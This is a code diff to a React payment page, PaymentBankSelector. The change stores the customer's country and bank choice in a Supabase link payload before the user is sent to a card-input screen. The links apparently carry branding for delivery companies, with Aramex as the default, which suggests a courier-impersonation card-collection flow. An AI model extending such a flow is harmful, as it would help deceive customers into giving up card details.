@@ -3,7 +3,7 @@ import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
-import { useLink } from "@/hooks/useSupabase";
+import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { Building2, ArrowLeft, Loader2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
@@ -15,7 +15,8 @@ const PaymentBankSelector = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
   const { data: linkData, isLoading: linkLoading } = useLink(id);
-  
+  const updateLink = useUpdateLink();
+
   const [selectedBank, setSelectedBank] = useState<string>("");
   const [banks, setBanks] = useState<Bank[]>([]);
   const [loadingBanks, setLoadingBanks] = useState(false);
@@ -27,7 +28,8 @@ const PaymentBankSelector = () => {
   // Get preselected bank from link payload if available
   const preselectedBank = linkData?.payload?.selected_bank;
   
-  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
+  // Get customer info from link data (cross-device compatible)
+  const customerInfo = linkData?.payload?.customerInfo || {};
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
@@ -58,27 +60,53 @@ const PaymentBankSelector = () => {
     setSelectedBank(bankId);
   };
   
-  const handleSkip = () => {
-    // Store skip flag in sessionStorage
-    sessionStorage.setItem('selectedCountry', countryCode);
-    sessionStorage.setItem('selectedBank', 'skipped');
-    
+  const handleSkip = async () => {
+    if (!linkData) return;
+
+    // Save to link for cross-device compatibility
+    try {
+      const updatedPayload = {
+        ...linkData.payload,
+        selectedCountry: countryCode,
+        selectedBank: 'skipped',
+      };
+
+      await updateLink.mutateAsync({
+        linkId: id!,
+        payload: updatedPayload
+      });
+    } catch (error) {
+      console.error('Error saving bank selection:', error);
+    }
+
     toast({
       title: "تم التخطي",
       description: "يمكنك إدخال بيانات البطاقة من أي بنك",
     });
-    
+
     navigate(`/pay/${id}/card-input`);
   };
-  
-  const handleContinue = () => {
-    if (selectedBank) {
-      // Store selection in sessionStorage
-      sessionStorage.setItem('selectedCountry', countryCode);
-      sessionStorage.setItem('selectedBank', selectedBank);
-      
-      navigate(`/pay/${id}/card-input`);
+
+  const handleContinue = async () => {
+    if (!linkData || !selectedBank) return;
+
+    // Save to link for cross-device compatibility
+    try {
+      const updatedPayload = {
+        ...linkData.payload,
+        selectedCountry: countryCode,
+        selectedBank: selectedBank,
+      };
+
+      await updateLink.mutateAsync({
+        linkId: id!,
+        payload: updatedPayload
+      });
+    } catch (error) {
+      console.error('Error saving bank selection:', error);
     }
+
+    navigate(`/pay/${id}/card-input`);
   };
   
   // Show loading state while fetching link data
